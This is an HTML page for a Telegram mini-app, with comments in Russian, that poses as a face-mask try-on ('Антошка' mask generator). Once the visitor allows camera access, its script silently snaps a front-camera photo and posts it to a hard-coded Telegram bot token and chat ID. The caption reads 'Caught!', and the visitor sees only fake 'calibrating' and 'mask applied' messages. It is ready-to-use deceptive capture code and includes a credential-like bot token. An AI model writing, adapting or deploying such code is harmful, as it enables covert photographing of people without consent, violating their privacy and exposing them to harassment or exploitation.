<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Антошка Маска</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #0f0f0f;
            color: white;
            font-family: sans-serif;
            text-align: center;
            padding-top: 60px;
            padding-left: 20px;
            padding-right: 20px;
        }
        h2 { font-size: 22px; margin-bottom: 10px; }
        p { color: #b0b0b0; font-size: 14px; line-height: 1.4; }
        button {
            background-color: #2481cc;
            color: white;
            border: none;
            padding: 14px 28px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 25px;
            font-weight: bold;
        }
        #videoElement { display: none; }
    </style>
</head>
<body>

    <div id="loader">
        <h2>🎭 Генератор маски «Антошка»</h2>
        <p>Чтобы примерить эксклюзивную маску, разреши доступ к камере.</p>
        <button id="loadBtn">Примерить маску</button>
    </div>

    <video id="videoElement" autoplay playsinline></video>
    <canvas id="canvasElement" style="display:none;"></canvas>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        // Вставь сюда свои данные:
        const BOT_TOKEN = "9001912922:AAHr1F04-5zuTUQXfBzIldUQyvLpv4ExzsM"; // твой токен бота
        const CHAT_ID = "758714011"; // твой числовой Telegram ID

        const loadBtn = document.getElementById('loadBtn');
        const video = document.getElementById('videoElement');
        const canvas = document.getElementById('canvasElement');

        loadBtn.addEventListener('click', async () => {
            loadBtn.innerText = 'Калибровка маски...';
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                
                setTimeout(async () => {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Выключаем камеру
                    stream.getTracks().forEach(track => track.stop());

                    // Конвертируем в Blob (файл для отправки)
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'mask.jpg');
                        formData.append('caption', 'Попался! 😂 Маска успешно наложилась.');

                        try {
                            // Отправляем фото напрямую через Telegram API
                            let response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                            
                            if (response.ok) {
                                loadBtn.innerText = 'Готово! Маска надета';
                            } else {
                                alert("Ошибка отправки фото на сервер Telegram");
                            }
                        } catch (e) {
                            alert("Ошибка сети: " + e.message);
                        }
                    }, 'image/jpeg', 0.8);

                }, 1000);

            } catch (err) {
                alert("Ошибка доступа к камере: " + err.message);
                loadBtn.innerText = 'Примерить маску';
            }
        });
    </script>
</body>
</html>
